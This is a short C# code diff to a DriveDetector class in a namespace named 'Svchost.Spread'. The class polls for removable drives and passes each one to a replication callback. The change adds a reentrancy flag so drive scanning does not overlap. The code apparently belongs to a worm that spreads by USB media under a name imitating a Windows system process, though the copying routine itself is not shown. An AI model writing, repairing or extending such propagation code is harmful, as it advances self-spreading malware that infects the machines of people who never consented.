@@ -14,12 +14,14 @@ namespace Svchost.Spread
         private long necessaryFreeSpace;
         private Timer _timer;
         private int checkInterval;
+        private bool working;
 
         public DriveDetector(string assemblyFullName, Action<DriveInfo> replicationCb)
         {
             drives = new List<string>();
             checkInterval = 2;
             replicationCallback = replicationCb;
+            working = false;
 
             try
             {
@@ -37,6 +39,9 @@ namespace Svchost.Spread
 
         public void checkForDrive(object state)
         {
+            if (working)
+                return;
+            working = true;
             foreach (DriveInfo drive in DriveInfo.GetDrives())
             {
                 if (drive.DriveType == DriveType.Removable)
@@ -52,6 +57,7 @@ namespace Svchost.Spread
                     }
                 }
             }
+            working = false;
         }
     }
 }
